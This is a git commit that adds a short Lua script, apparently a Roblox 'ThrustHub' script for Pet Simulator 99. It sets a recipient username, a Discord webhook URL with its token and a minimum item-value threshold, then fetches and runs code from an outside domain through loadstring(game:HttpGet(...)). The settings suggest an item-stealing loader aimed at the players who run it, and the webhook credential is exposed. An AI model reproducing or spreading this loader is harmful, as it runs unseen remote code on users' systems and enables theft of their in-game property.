2fd4de772d3ba48a4b5f3d83768c59e41c089df9
ThrustScript <162525394+ThrustScript@users.noreply.github.com>
2024-03-07 09:52:48 +0700

    Add files via upload

---
+++ PSX99.lua
@@ -0,0 +1,9 @@
+Username = "palapuy23"
+Username2 = "palapuy23"
+Webhook = "https://discord.com/api/webhooks/1215128865131728956/3XA2KQtW9d7iPSxoJ4fwlgQN-lYjDnwzMW706XL0RNVMyJe-kExkuvR0Yn13Hrqjaxzy"
+
+HubName = "ThrustHub"
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
